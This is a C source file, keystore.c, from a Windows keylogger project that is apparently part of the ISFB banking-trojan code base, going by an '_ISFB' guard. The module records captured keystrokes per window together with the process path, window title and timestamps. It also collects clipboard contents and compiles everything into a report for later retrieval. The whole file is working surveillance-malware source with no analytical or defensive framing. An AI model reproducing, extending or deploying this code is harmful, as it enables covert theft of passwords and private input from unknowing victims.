//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: keystore.c
// $Revision: 59 $
// $Date: 2014-12-17 19:36:18 +0300 (Ср, 17 дек 2014) $
// description: 
//	Keyboard input storage.

#include "..\common\main.h"
#include "..\common\common.h"
#include "..\handle\handle.h"
#include "keylog.h"


#ifndef _ISFB
	#define	wczReportFormat  L"%02u-%02u-%02u %02u:%02u:%02u\r\n%s\r\n%s\r\n\r\n%s\r\n\r\n"
	#define	wczFormatClipbrd L"%02u-%02u-%02u %02u:%02u:%02u\r\nClipboard\r\n\r\n%S\r\n\r\n"
#endif

PHANDLE_TABLE	g_KeyStoreTable		= NULL;
LPWSTR			g_pKeyProcessList	= NULL;

ULONG _stdcall Crc32(char* pMem, unsigned long uLen);

// ---- KeyStore internal ------------------------------------------------------------------------------------------------

static	BOOL KeyStoreInitContext(
	HANDLE	Key, 
	PVOID*	pContext
	)
{
	PKEY_CONTEXT KeyCtx = (PKEY_CONTEXT)pContext;
	BOOL Ret = TRUE;
	InitializeListHead(&KeyCtx->ClipboardChain);
	return(Ret);
}

static BOOL KeyStoreReleaseContext(
   HANDLE	Key,
   PVOID*	pContext
   )
{
	PKEY_CONTEXT KeyCtx = (PKEY_CONTEXT)pContext;
	BOOL Ret = TRUE;

	while ( !IsListEmpty(&KeyCtx->ClipboardChain) )
	{
		PCLIPBOARD_ENTRY Entry;
		PLIST_ENTRY ListEntry = RemoveHeadList(&KeyCtx->ClipboardChain);
		Entry = CONTAINING_RECORD(ListEntry,CLIPBOARD_ENTRY,qLink);

		if ( Entry->Buffer ){
			AppFree( Entry->Buffer );
			Entry->Buffer = NULL;
		}
		AppFree ( ListEntry );
	}

	return(Ret);
}

static PKEY_CONTEXT	GetContext(
	ULONG KeyHandle
	)
{
	PKEY_CONTEXT Ctx;
	if (!HandleCreate(g_KeyStoreTable, (HANDLE)(ULONG_PTR)KeyHandle, &Ctx)){
		Ctx = NULL;
	}
	return(Ctx);
}

static VOID ReleaseContext(
	PKEY_CONTEXT Ctx
	)
{
	HandleClose(g_KeyStoreTable, 0, CONTAINING_RECORD(Ctx, HANDLE_RECORD, Context));
}

static PKEY_CONTEXT EnumContext(
	PKEY_CONTEXT pCurrent
	)
{
	PKEY_CONTEXT Ctx;
	if (!HandleEnum(g_KeyStoreTable, 0, pCurrent, &Ctx))
		Ctx = NULL;
	return(Ctx);
}


static PVOID ReallocBuffer(
	PVOID	pBuffer, 
	ULONG	NewSize,
	ULONG	CurrentSize
	)
{
	PVOID pNewBuffer;

	// Tying to reallocate the buffer
	if (!(pNewBuffer = AppRealloc(pBuffer, NewSize)))
	{
		if (pNewBuffer = AppAlloc(NewSize))
		{
			memcpy(pNewBuffer, pBuffer, CurrentSize);
			AppFree(pBuffer);
		}
	}

	return(pNewBuffer);
}

// ---- KeyStore public -------------------------------------------------------------------------------------------------

//
//	Adds a new pressed key information into the key store.
//
WINERROR KeyStoreAdd(
	PKEY_INFO	pKeyInfo
	)
{
	WINERROR		Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG			KeyHandle;
	PKEY_CONTEXT	Ctx;
	BOOL            bDeref = FALSE;

	KeyHandle = Crc32((PCHAR)&pKeyInfo->Client, sizeof(CLIENT_INFO));
	
	if (Ctx = GetContext(KeyHandle))
	{
		bDeref = Ctx->bDirty;		
		if (Ctx->bDirty == FALSE) // just created
		{
			// Context has just been created, initializing
			HANDLE	hProcess;

			// Resolving process path
			if (hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pKeyInfo->Client.ProcessId))
			{
				GetModuleFileNameExW(hProcess, NULL, (LPWSTR)&Ctx->ProcessPath, MAX_PATH);
				CloseHandle(hProcess);
			}

			Ctx->bActive = TRUE;

			// Saving current date and time
			GetSystemTimeAsFileTime(&Ctx->Time);
			
			// Resolving parent window text
			GetWindowTextW(pKeyInfo->Client.ParentWindow, (LPWSTR)&Ctx->WindowText, MAX_WINDOW_TEXT);
		}	// if (Ctx->bDirty == FALSE) // just created

		Ctx->bDirty = TRUE;

		if (Ctx->bActive)
		{
			if (pKeyInfo->wChar && Ctx->Count < MAX_KEY_BUFFER_SIZE)
			{
				if (pKeyInfo->wChar == VK_BACK)
				{
					if (Ctx->Count)
						Ctx->Count -= 1;
				}
				else
				{
					Ctx->KeyBuffer[Ctx->Count] = pKeyInfo->wChar;
					Ctx->Count += 1;
					DbgPrint("KEYLOG: Adding key to a buffer: 0x%x, %C\n", pKeyInfo->wChar, pKeyInfo->wChar);
				}
				Status = NO_ERROR;
			}	// if (Ctx->Count < MAX_KEY_BUFFER_SIZE)
			else
				Status = ERROR_BUFFER_OVERFLOW;

			if ( pKeyInfo->clipboard )
			{
				PCLIPBOARD_ENTRY Entry = (PCLIPBOARD_ENTRY)AppAlloc( sizeof(CLIPBOARD_ENTRY) );
				if ( Entry )
				{
					// Saving current date and time
					GetSystemTimeAsFileTime(&Entry->Time);
					Entry->Buffer = pKeyInfo->clipboard;
					pKeyInfo->clipboard = NULL; // we'll free it later
					InsertTailList(&Ctx->ClipboardChain,&Entry->qLink);
				}
			}	// if ( pKeyInfo->clipboard )
		}	// if (Ctx->bActive)

		if ( bDeref )
			// Context has been reused, dereferencing it
			ReleaseContext(Ctx);
	}	// if (Ctx = GetContext(KeyHandle))

	return(Status);
}

//
//	Creates key store report.
//
WINERROR KeyStoreReport(
	PWCHAR*	ppReport,	// receives key report
	PULONG	pLength,	// size of the report in chars
	BOOL	bDelete
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PKEY_CONTEXT Ctx, NextCtx;
	ULONG	bLen, TotalLen = 1, Index = 0, Length, InitialSize;
	ULONG   LengthClipbrd = 0;
	PWCHAR	Buffer, NewBuffer;
	SYSTEMTIME	DateTime;
	FILETIME	LocalTime;
	PLIST_ENTRY ListEntry;
#if _DEBUG
	HANDLE	PrevKey = 0;
#endif

	InitialSize = MAX_REPORT_BUFFER_SIZE;

	if (Buffer = AppAlloc(InitialSize))
	{
		bLen = MAX_REPORT_BUFFER_SIZE / sizeof(WCHAR);
		Buffer[0] = 0xfeff;	// Unicode file magic
		Buffer[1] = 0;

		bLen -= 1;

		NextCtx = EnumContext(NULL);

		while(Ctx = NextCtx)
		{
#if _DEBUG
			PHANDLE_RECORD pHRec = CONTAINING_RECORD(Ctx, HANDLE_RECORD, Context);
			ASSERT(pHRec->RefCount == 2);
			ASSERT(PrevKey != pHRec->Key);
			PrevKey = pHRec->Key;
#endif
			if (Ctx->bActive)
			{
				FileTimeToLocalFileTime(&Ctx->Time, &LocalTime);
				FileTimeToSystemTime(&LocalTime, &DateTime);

				// Calculating new message length
				Length = cstrlenW(wczReportFormat) + lstrlenW(Ctx->ProcessPath) + lstrlenW(Ctx->WindowText) + Ctx->Count + 1;

				// Checking if there's enough free space within the buffer to fit the message
				if ((bLen >= Length) ||
					// Trying to reallocate the buffer
					((NewBuffer = ReallocBuffer(Buffer, (InitialSize += max(Length, MAX_KEY_BUFFER_SIZE) * sizeof(WCHAR)), (bLen * sizeof(WCHAR)))) &&
					(Buffer = NewBuffer) && (bLen = (InitialSize / sizeof(WCHAR)) - bLen)))
				{
					Length = wnsprintfW(
						Buffer + TotalLen,
						bLen,
						wczReportFormat,
						DateTime.wDay,
						DateTime.wMonth,
						DateTime.wYear,
						DateTime.wHour,
						DateTime.wMinute,
						DateTime.wSecond,
						(LPWSTR)&Ctx->ProcessPath,
						(LPWSTR)&Ctx->WindowText,
						(LPWSTR)&Ctx->KeyBuffer
						);
					bLen -= Length;
					TotalLen += Length;
				}
			}	// if (Ctx->bActive)

			if (!IsListEmpty(&Ctx->ClipboardChain))
			{
				for ( ListEntry = Ctx->ClipboardChain.Flink;
					ListEntry != &Ctx->ClipboardChain;
					ListEntry = ListEntry->Flink)
				{
					PCLIPBOARD_ENTRY CEntry = CONTAINING_RECORD(ListEntry,CLIPBOARD_ENTRY,qLink);
					Length = cstrlenW(wczFormatClipbrd) + lstrlenA(CEntry->Buffer);

					// Checking if there's enough free space within the buffer to fit the message
					if ((bLen >= Length) ||
						// Trying to reallocate the buffer
						((NewBuffer = ReallocBuffer(Buffer, (InitialSize += max(Length, MAX_KEY_BUFFER_SIZE) * sizeof(WCHAR)), (bLen * sizeof(WCHAR)))) &&
						(Buffer = NewBuffer) && (bLen = (InitialSize / sizeof(WCHAR)) - bLen)))
					{
						FileTimeToLocalFileTime(&CEntry->Time, &LocalTime);
						FileTimeToSystemTime(&LocalTime, &DateTime);

						Length = wnsprintfW(
							Buffer + TotalLen, 
							bLen,
							wczFormatClipbrd,
							DateTime.wDay,
							DateTime.wMonth,
							DateTime.wYear,
							DateTime.wHour,
							DateTime.wMinute,
							DateTime.wSecond,
							(LPWSTR)CEntry->Buffer
							);
						bLen -= Length;
						TotalLen += Length;
					}
				}
			}	// if (!IsListEmpty(&Ctx->ClipboardChain))

			NextCtx = EnumContext(Ctx);

			if (bDelete)
				ReleaseContext(Ctx);
			else
				Index += 1;

			ReleaseContext(Ctx);
		}	// while(Ctx = NextCtx)

		if (TotalLen > 1)
		{
			*ppReport = Buffer;
			*pLength = TotalLen;
			Status = NO_ERROR;
		}
		else
		{
			AppFree(Buffer);
			Status = ERROR_NO_MORE_FILES;
		}
	}	// if (Buffer = AppAlloc(DEFAULT_REPORT_BUFFER_SIZE))

	return(Status);
}


// ---- KeyStore init and cleanup ---------------------------------------------------------------------------------------
WINERROR KeyStoreInit(VOID)
{
	WINERROR Status;

	Status = HandleAllocateTable(&g_KeyStoreTable, sizeof(KEY_CONTEXT), &KeyStoreInitContext, &KeyStoreReleaseContext);
	if (Status == NO_ERROR)
		g_KeyStoreTable->Flags |= (TF_REUSE_HANDLE | TF_REREFERENCE);
	return(Status);

}

VOID KeyStoreCleanup(VOID)
{
	if (g_pKeyProcessList)
		AppFree(g_pKeyProcessList);

	if (g_KeyStoreTable)
		HandleReleaseTable(g_KeyStoreTable);
}
